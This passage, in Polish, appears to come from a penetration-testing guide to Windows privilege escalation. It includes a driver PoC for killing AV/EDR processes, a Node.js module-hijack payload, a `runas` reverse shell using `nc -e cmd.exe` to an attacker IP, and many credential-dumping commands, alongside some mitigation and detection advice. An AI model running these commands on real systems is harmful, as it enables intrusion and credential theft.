- Kończenie dowolnych procesów, w tym Protected Process/Light (PP/PPL), co umożliwia zabicie AV/EDR z poziomu user land za pośrednictwem kernela.

Minimalny wzorzec PoC (tryb użytkownika):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Mitigacje dla deweloperów
- Zawsze ustawiaj FILE_DEVICE_SECURE_OPEN podczas tworzenia obiektów urządzeń, które mają być ograniczone przez DACL.
- Weryfikuj kontekst wywołującego przy operacjach uprzywilejowanych. Dodaj sprawdzanie PP/PPL przed zezwoleniem na zakończenie procesu lub zwrócenie uchwytów.
- Ogranicz IOCTL (maski dostępu, METHOD_*, walidacja danych wejściowych) i rozważ użycie modeli pośredniczących zamiast bezpośrednich uprawnień jądra.

Pomysły na wykrywanie dla obrońców
- Monitoruj otwieranie podejrzanych nazw urządzeń z poziomu user-mode (np. \\ .\\amsdk*) oraz określone sekwencje IOCTL wskazujące na nadużycie.
- Wymuszaj stosowanie listy blokowanych podatnych sterowników firmy Microsoft (HVCI/WDAC/Smart App Control) i utrzymuj własne listy dozwolonych/zablokowanych.


## PATH DLL Hijacking

Jeśli masz **uprawnienia do zapisu w folderze znajdującym się na PATH**, możesz przejąć kontrolę nad biblioteką DLL załadowywaną przez proces i **eskalować uprawnienia**.<sup>[[2]](#references)</sup>

Sprawdź uprawnienia do wszystkich folderów w PATH:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Więcej informacji o tym, jak wykorzystać tę kontrolę:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Przejęcie rozwiązywania modułów Node.js / Electron przez `C:\node_modules`

Jest to wariant **niekontrolowanej ścieżki wyszukiwania w Windows**, który dotyczy aplikacji **Node.js** i **Electron**, gdy wykonują import bezwzględny, taki jak `require("foo")`, a oczekiwanego modułu **brakuje**.<sup>[[20]](#references)</sup>

Node wyszukuje pakiety, przechodząc w górę drzewa katalogów i sprawdzając foldery `node_modules` w każdym katalogu nadrzędnym. W Windows wyszukiwanie może dotrzeć do katalogu głównego dysku, więc aplikacja uruchomiona z `C:\Users\Administrator\project\app.js` może sprawdzać kolejno:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Jeśli **użytkownik z niskimi uprawnieniami** może utworzyć `C:\node_modules`, może umieścić tam złośliwy plik `foo.js` (lub folder pakietu) i poczekać, aż **proces Node/Electron z wyższymi uprawnieniami** spróbuje rozwiązać brakującą zależność. Payload zostanie wykonany w kontekście bezpieczeństwa procesu ofiary, co prowadzi do **LPE**, gdy proces docelowy działa jako administrator, w ramach podwyższonego zadania harmonogramu/zewnętrznego procesu usługi lub jako automatycznie uruchamiana aplikacja desktopowa z podwyższonymi uprawnieniami.

Jest to szczególnie częste, gdy:

- zależność jest zadeklarowana w `optionalDependencies`<sup>[[22]](#references)</sup>
- biblioteka innej firmy opakowuje `require("foo")` w `try/catch` i kontynuuje działanie po błędzie
- pakiet został usunięty z kompilacji produkcyjnych, pominięty podczas pakowania lub nie udało się go zainstalować
- podatne wywołanie `require()` znajduje się głęboko w drzewie zależności, a nie w głównym kodzie aplikacji

### Wyszukiwanie podatnych celów

Użyj **Procmon**, aby potwierdzić ścieżkę rozwiązywania modułów:<sup>[[23]](#references)</sup>

- Filtruj według `Process Name` = plik wykonywalny procesu docelowego (`node.exe`, plik EXE aplikacji Electron lub proces wrappera)
- Filtruj według `Path` `contains` `node_modules`
- Skup się na zdarzeniach `NAME NOT FOUND` i ostatnim pomyślnym otwarciu w `C:\node_modules`

Przydatne wzorce do wyszukania podczas przeglądu kodu w rozpakowanych plikach `.asar` lub źródłach aplikacji:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Zidentyfikuj **nazwę brakującego pakietu** za pomocą Procmon lub przeglądu źródeł.
2. Utwórz katalog wyszukiwania root, jeśli jeszcze nie istnieje:

```powershell
mkdir C:\node_modules
```

3. Umieść moduł o dokładnie oczekiwanej nazwie:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Wywołaj aplikację ofiary. Jeśli aplikacja spróbuje wykonać `require("foo")`, a prawidłowego modułu brakuje, Node może załadować `C:\node_modules\foo.js`.

Rzeczywiste przykłady brakujących modułów opcjonalnych pasujących do tego wzorca to `bluebird` i `utf-8-validate`, ale **technika** jest uniwersalna: znajdź dowolny **brakujący bare import**, który uprzywilejowany proces Windows Node/Electron rozwiąże.

### Wskazówki dotyczące wykrywania i hardeningu

- Generuj alerty, gdy użytkownik utworzy `C:\node_modules` lub zapisze w nim nowe pliki/pakiety `.js`.
- Szukaj procesów o wysokim poziomie integralności odczytujących dane z `C:\node_modules\*`.
- Dołączaj wszystkie zależności runtime do produkcyjnych wdrożeń i audytuj użycie `optionalDependencies`.
- Sprawdzaj kod firm trzecich pod kątem wzorców `try { require("...") } catch {}` ignorujących błędy.
- Wyłączaj opcjonalne sprawdzanie, jeśli biblioteka to umożliwia (na przykład niektóre wdrożenia `ws` mogą pominąć sprawdzanie starszego `utf-8-validate` przez ustawienie `WS_NO_UTF_8_VALIDATE=1`).

## Sieć

### Udziały

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### plik hosts

Sprawdź, czy w pliku hosts nie ma wpisów innych znanych komputerów.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Interfejsy sieciowe i DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Otwarte porty

Sprawdź z zewnątrz, czy dostęp do **usług z ograniczonym dostępem** jest ograniczony.

```bash
netstat -ano #Opened ports?
```

W przypadku lokalnego listenera ustal, jaki proces i użytkownik są z nim powiązani, jaka jest ścieżka do pliku wykonywalnego oraz jaka usługa lub zaplanowane zadanie go uruchamia. Usługa zdalnego sterowania może zapewnić dostęp jako jej użytkownik desktopowy tylko wtedy, gdy pozwalają na to mechanizmy uwierzytelniania i kontroli poleceń. Niestandardowa aplikacja TCP działająca z konta o wyższych uprawnieniach wymaga osobnej analizy: listener i ścieżka do pliku binarnego to jedynie wskazówki, a wykorzystanie błędu uszkodzenia pamięci po uwierzytelnieniu wymaga analizy dokładnie tego pliku binarnego oraz danych wejściowych, do których można uzyskać dostęp. Jeśli wygląda na to, że ujawniony port należy do procesu systemowego, porównaj go z wynikiem polecenia [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface), zanim przypiszesz go do usługi backendowej; sama reguła przekierowania nie dowodzi, że miejsce docelowe jest osiągalne ani podatne na ataki.

### Tabela routingu

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### Tabela ARP

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Reguły zapory sieciowej

[**Sprawdź tę stronę, aby znaleźć polecenia związane z zaporą sieciową**](../basic-cmd-for-pentesters.md#firewall) **(wyświetlanie reguł, tworzenie reguł, wyłączanie, wyłączanie...)**

Więcej[ poleceń do enumeracji sieci znajdziesz tutaj](../basic-cmd-for-pentesters.md#network)

### Podsystem Windows dla systemu Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Binarny plik `bash.exe` można też znaleźć w `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Jeśli uzyskasz uprawnienia użytkownika root, możesz nasłuchiwać na dowolnym porcie (przy pierwszym użyciu `nc.exe` do nasłuchiwania na porcie pojawi się graficzne okno z pytaniem, czy `nc` ma być dozwolone przez zaporę).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Aby łatwo uruchomić bash jako root, możesz użyć `--default-user root`

System plików `WSL` możesz przeglądać w folderze `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

Uprawnienia `root` w systemie Linux uruchomionym w WSL same w sobie nie nadają uprawnień administratora w Windows. Jeśli bieżąca tożsamość Windows może odczytać system plików dystrybucji, sprawdź pliki historii powłoki (w tym `/root/.bash_history`) pod kątem poleceń, które mogły zapisać dane uwierzytelniające; eskalacja nadal wymaga prawidłowego konta o wyższych uprawnieniach i dozwolonej ścieżki uwierzytelniania. Układ `LocalState\rootfs` dotyczy starszych instalacji WSL; w WSL 2 dystrybucja jest zwykle przechowywana na wirtualnym dysku [`ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), dlatego najpierw ustal rzeczywistą dystrybucję i ścieżkę przechowywania. Unikaj wyświetlania zawartości historii podczas automatycznego rozpoznawania.

## Poświadczenia Windows

### Poświadczenia Winlogon

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Traktuj `DefaultUserName` i `DefaultDomainName` jako kontekst konta, a nie poświadczenia. Niepusta wartość `DefaultPassword` lub `AltDefaultPassword` oznacza znalezisko dotyczące hasła przechowywanego w rejestrze w postaci jawnego tekstu. Jeśli `AutoAdminLogon=1`, ale nie można odczytać hasła w postaci jawnego tekstu, jest to tylko wskazówka: [Sysinternals Autologon może przechowywać hasło jako sekret LSA](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), a zwykły odczyt rejestru nie pozwala ustalić, czy taki sekret istnieje ani czy można go odzyskać. Przed zgłoszeniem ujawnienia poświadczeń sprawdź prawa dostępu i rzeczywistą konfigurację logowania.

### Menedżer poświadczeń / Windows Vault

Z [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault przechowuje poświadczenia użytkowników do serwerów, witryn i innych programów, których **Windows** może używać do **automatycznego logowania użytkowników**. Początkowo może się wydawać, że użytkownicy mogą przechowywać poświadczenia do witryn takich jak Facebook, Twitter czy Gmail, a przeglądarki będą logować się automatycznie, ale tak to nie działa.

Windows Vault przechowuje poświadczenia, których Windows może używać do automatycznego logowania użytkowników. Oznacza to, że każda **aplikacja Windows, która potrzebuje poświadczeń, aby uzyskać dostęp do zasobu** (serwera lub witryny), **może korzystać z Credential Manager i Windows Vault** oraz używać zapisanych poświadczeń zamiast za każdym razem prosić użytkowników o podanie nazwy użytkownika i hasła.

Jeśli aplikacje nie współpracują z Credential Manager, nie sądzę, by mogły używać poświadczeń do danego zasobu. Jeśli więc aplikacja ma korzystać z vaulta, powinna w jakiś sposób **komunikować się z Credential Manager i zażądać poświadczeń do danego zasobu** z domyślnego magazynu.

Użyj `cmdkey`, aby wyświetlić zapisane poświadczenia na komputerze.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Następnie możesz użyć `runas` z opcją `/savecred`, aby użyć zapisanych poświadczeń. Poniższy przykład wywołuje zdalny plik binarny za pośrednictwem udziału SMB.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Używanie `runas` z podanym zestawem poświadczeń.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Należy pamiętać o mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) lub module [Empire Powershells](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Nowoczesne aplikacje Windows UWP, Microsoft Edge i nowoczesne usługi systemowe przechowują tokeny uwierzytelniające oraz hasła w postaci jawnej w `PasswordVault` platformy Universal Windows Platform (UWP) (dostępnym również jako `Web Credentials` w `vaultcmd`). Ten magazyn jest izolowany dla sesji i można go odszyfrować natywnie bez uprawnień administratora ani `SeDebugPrivilege`.

Uruchom to polecenie PowerShell w aktywnej sesji użytkownika, aby natychmiast zrzucić i odszyfrować wszystkie zapisane nazwy użytkowników oraz hasła w postaci jawnej:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** zapewnia metodę symetrycznego szyfrowania danych, wykorzystywaną głównie w systemie operacyjnym Windows do symetrycznego szyfrowania asymetrycznych kluczy prywatnych. Szyfrowanie to wykorzystuje sekret użytkownika lub systemu, który w znacznym stopniu zwiększa entropię.

**DPAPI umożliwia szyfrowanie kluczy za pomocą klucza symetrycznego wyprowadzanego z danych logowania użytkownika**. W przypadku szyfrowania systemowego wykorzystuje sekrety uwierzytelniania domenowego systemu.

Zaszyfrowane klucze RSA użytkowników, chronione przez DPAPI, są przechowywane w katalogu `%APPDATA%\Microsoft\Protect\{SID}`, gdzie `{SID}` oznacza [identyfikator zabezpieczeń](https://en.wikipedia.org/wiki/Security_Identifier) użytkownika. **Klucz DPAPI, przechowywany w tym samym pliku co klucz główny chroniący klucze prywatne użytkownika**, zwykle składa się z 64 bajtów losowych danych. (Należy pamiętać, że dostęp do tego katalogu jest ograniczony, co uniemożliwia wyświetlenie jego zawartości za pomocą polecenia `dir` w CMD, ale można ją wyświetlić w PowerShell).

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Możesz użyć **modułu mimikatz** `dpapi::masterkey` z odpowiednimi argumentami (`/pvk` lub `/rpc`), aby go odszyfrować.

**Pliki poświadczeń chronione hasłem głównym** zwykle znajdują się w:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Możesz użyć **modułu mimikatz** `dpapi::cred` z odpowiednim `/masterkey`, aby odszyfrować dane.\
Możesz **wyodrębnić wiele DPAPI** **masterkeys** z **pamięci** za pomocą modułu `sekurlsa::dpapi` (jeśli masz uprawnienia root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Poświadczenia PowerShell

**Poświadczenia PowerShell** są często używane do **skryptowania** i zadań automatyzacji jako wygodny sposób przechowywania zaszyfrowanych poświadczeń. Są one chronione za pomocą **DPAPI**, co zazwyczaj oznacza, że można je odszyfrować tylko przez tego samego użytkownika na tym samym komputerze, na którym zostały utworzone.

Wyeksportowane poświadczenie może mieć dowolną nazwę pliku lub ścieżkę `.xml`. Gdy skrypt lub spis plików wskazuje takie poświadczenie, ustal rzeczywisty katalog profilu konta, zamiast zakładać, że znajduje się on w `C:\Users`: [Windows może umieszczać profile w innych lokalizacjach](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Plik, który można odczytać, to jedynie wskazówka; [Windows `Export-Clixml` wiąże zaszyfrowane poświadczenie z użytkownikiem i komputerem, z których je wyeksportowano](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), a odzyskane konto musi niezależnie mieć odpowiednie uprawnienia do docelowej usługi. Najpierw sprawdź ścieżki i ACL, nie wyświetlając podczas rutynowego wyszukiwania zaszyfrowanych ani jawnych wartości.

Aby **odszyfrować** poświadczenia PS z pliku, który je zawiera, możesz wykonać:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Zapisane połączenia RDP

Można je znaleźć w `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\  
oraz w `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Ostatnio uruchamiane polecenia

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Menedżer poświadczeń pulpitu zdalnego**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Użyj modułu Mimikatz `dpapi::rdg` z odpowiednim `/masterkey`, aby **odszyfrować pliki .rdg**\
Za pomocą modułu Mimikatz `sekurlsa::dpapi` możesz **wyodrębnić wiele kluczy głównych DPAPI** z pamięci

**mRemoteNG używa innego magazynu połączeń.** Sprawdź czytelne pliki XML w `%APPDATA%\mRemoteNG` i folderze Dokumenty użytkownika, w tym pliki o zwykłych nazwach, takich jak `config.xml`. Zidentyfikuj schemat połączeń i zaszyfrowane atrybuty `Password`, zanim uznasz plik XML za źródło danych uwierzytelniających. Zapisana wartość nie jest hasłem DPAPI/RDCMan; jej odzyskanie zależy od ustawień szyfrowania pliku i od tego, czy użyto niestandardowego hasła głównego. Podczas szerokiego przeszukiwania nie wyświetlaj zaszyfrowanych wartości.

**Eksporty profili Remote Desktop Plus** mogą być też dostępne w katalogach użytkowników lub we współdzielonym folderze administracyjnym. Eksport `profiles.xml` ze starszej wersji zawiera wpisy `Data/Profile` z elementami `ProfileName`, `Password` i `Secure`. Niepusty element hasła traktuj jako trop dotyczący danych uwierzytelniających, ale nie wyświetlaj go ani nie zakładaj, że zawiera tekst jawny: [informacje producenta](https://www.donkz.nl/) wskazują, że ochrona profilu może być powiązana z kontem i komputerem, na których go utworzono, lub skonfigurowana mniej restrykcyjnie. Zanim na nim polegniesz, potwierdź pochodzenie pliku i warunki jego odzyskania.

### Sticky Notes

Czasami użytkownicy zapisują hasła i inne informacje w aplikacjach z karteczkami samoprzylepnymi. Aplikacja Sticky Notes firmy Microsoft, dystrybuowana jako pakiet, zwykle przechowuje notatki w `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; starsze lub inne aplikacje mogą korzystać z innych magazynów w profilu użytkownika, w tym z LevelDB. Przed uznaniem braku pliku SQLite za brak notatek ustal, jaka aplikacja jest zainstalowana i jakiego formatu magazynu używa.

Jeśli Sticky Notes korzysta z dziennika zapisu z wyprzedzeniem SQLite (WAL), sama kopia `plum.sqlite` może nie zawierać ostatnio zatwierdzonych notatek. Zachowaj pasujący plik `plum.sqlite-wal` wraz ze spójną kopią bazy danych oraz dołącz `plum.sqlite-shm`, jeśli jest dostępny; indeks w pamięci współdzielonej można odbudować, ale WAL stanowi część trwałego stanu bazy danych. Zobacz [dokumentację WAL SQLite](https://www.sqlite.org/wal.html). Notatka zawierająca nazwę konta lub hasło jest tylko tropem dotyczącym danych uwierzytelniających: osobno zweryfikuj konto, dozwolony dostęp i ponowne użycie hasła. Zaszyfrowany wpis menedżera haseł wymaga ponadto właściwego klucza deszyfrującego i interpretacji właściwej dla danej aplikacji, zanim będzie można uznać go za potwierdzenie możliwości logowania na konto o wyższych uprawnieniach.

### AppCmd.exe

**Pamiętaj, że aby odzyskać hasła z AppCmd.exe, musisz być administratorem i uruchomić je z poziomem High Integrity.**\
**AppCmd.exe** znajduje się w katalogu `%systemroot%\system32\inetsrv\`.\
Jeśli ten plik istnieje, możliwe, że skonfigurowano jakieś **dane uwierzytelniające**, które można **odzyskać**.

Ten kod pochodzi z [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Sprawdź, czy istnieje `C:\Windows\CCM\SCClient.exe` .\
Installery są **uruchamiane z uprawnieniami SYSTEM**, wiele z nich jest podatnych na **DLL Sideloading (Informacje z** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Pliki i rejestr (poświadczenia)

### Artefakty poświadczeń narzędzi pomocy technicznej w rejestrze

Niektóre starsze instalacje zdalnej pomocy technicznej zachowują nazwy wartości związane z hasłami w ustalonych kluczach rejestru aplikacji. Na przykład `SecurityPasswordAES` w TeamViewerze wskazywało skonfigurowane statyczne hasło sesji w wersjach wcześniejszych niż 9, zgodnie z [wyjaśnieniem dostawcy dotyczącym klucza rejestru](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988). Znacznik w postaci nazwy wartości jest jedynie wskazówką do weryfikacji: przed oceną danego poświadczenia sprawdź zainstalowaną wersję, możliwość odczytu danych wartości, ich format oraz bieżące zachowanie uwierzytelniania. Przejście od hasła do zdalnej pomocy technicznej do bardziej uprzywilejowanego konta Windows wymaga również rzeczywistego ponownego użycia hasła oraz uprawnień do tego konta. Nie umieszczaj tekstu zaszyfrowanego ani odzyskanych haseł w rutynowych wynikach enumeracji.

### Udostępnione arkusze kalkulacyjne z chronionymi arkuszami

Jeśli podejrzewasz, że czytelny, udostępniony skoroszyt zawiera dane konta, odróżnij **szyfrowanie pliku** od ochrony arkusza lub ukrytych kolumn. [Microsoft informuje](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel), że ochrona arkusza kontroluje edycję i nie jest funkcją bezpieczeństwa; sama w sobie nie oznacza, że zawartość skoroszytu jest zaszyfrowana. Przeglądaj wyłącznie pliki, do których masz uprawnienia i które są istotne, oraz unikaj wyświetlania potencjalnych sekretów podczas szeroko zakrojonej enumeracji. Sama dostępna ścieżka do pliku `.xlsx`, chroniony arkusz lub ukryta kolumna nie dowodzą, że istnieją poświadczenia ani że którekolwiek konto ma wyższe uprawnienia; osobno zweryfikuj rzeczywiste dane i bieżące uprawnienia konta.

### Zachowane poprawki zmian na serwerze CI

Serwer CI może zachować przesłane zmiany w kodzie źródłowym w swoim katalogu danych, nawet po zakończeniu kompilacji. [TeamCity dokumentuje](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` jako lokalizację przechowywania zmian zdalnych; katalog danych można skonfigurować i nie musi znajdować się w `ProgramData`. Czytelna poprawka może zachować usunięte lub dodane odwołania do pliku z poświadczeniami, klucza szyfrującego albo skryptu używającego obu tych elementów. Na przykład procedura PowerShell `ConvertTo-SecureString -Key` wymaga zarówno klucza AES, jak i zaszyfrowanego ciągu; [Microsoft dokumentuje](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring), że klucz jest dostarczany osobno. Najpierw sprawdź wyłącznie dostępne nazwy poprawek, a następnie — jeśli masz do tego uprawnienia — przejrzyj istotną zawartość, nie wyświetlając sekretów w rutynowych wynikach enumeracji. Sama ścieżka do poprawki, zaszyfrowana wartość lub odwołanie do klucza nie dowodzą, że poświadczenie jest prawidłowe ani że zapewnia dostęp z wyższymi uprawnieniami. Ogranicz uprawnienia ACL katalogu danych i nie zapisuj sekretów w zmianach kompilacji.

### Niestandardowa rotacja haseł lokalnego administratora

Niestandardowy mechanizm rotacji haseł może przechowywać zaszyfrowane hasło lokalnego administratora w lokalnej usłudze, a dane logowania do magazynu danych — w czytelnym pliku `.env` lub obok pliku binarnego aktualizatora. Sprawdź łącznie zadanie zaplanowane aktualizatora, konto, uprawnienia ACL konfiguracji, nasłuchujący interfejs i uprawnienia do magazynu danych. Do magazynu danych nasłuchującego wyłącznie na interfejsie loopback nadal może uzyskać dostęp lokalny użytkownik z prawidłowymi danymi logowania, ale samo uwierzytelnienie nie dowodzi uprawnień do odczytu odpowiednich rekordów. Jeśli ziarno szyfrowania lub materiał klucza jest dostępny obok tekstu zaszyfrowanego, przed zaufaniem szyfrowaniu sprawdź dokładny sposób wyprowadzania klucza. Schemat deterministycznie wyprowadzający klucz AES z ujawnionego ziarna za pomocą Go [`math/rand`](https://pkg.go.dev/math/rand) nie nadaje się do ochrony tego hasła; dokumentacja Go określa ten pakiet jako nieodpowiedni do losowości w zastosowaniach związanych z bezpieczeństwem. Zanim uznasz odzyskane hasło za ścieżkę eskalacji, potwierdź, że jest aktualne i należy do konta z grupy lokalnych administratorów. Samo zadanie zaplanowane, ścieżka `.env` lub zaszyfrowany blob nie potwierdzają żadnego z tych warunków. Nie umieszczaj haseł ani materiału klucza w rutynowych wynikach enumeracji.

Do zarządzania hasłami lokalnych administratorów używaj [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview). Jego magazyny w katalogu lub usłudze Entra oraz mechanizmy kontroli dostępu różnią się od niestandardowego lokalnego magazynu danych; [role Elasticsearch](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) również określają, czy uwierzytelniony użytkownik magazynu danych może odczytać konkretny indeks.

### Archiwa wtyczek serwera Java i ponowne użycie poświadczeń

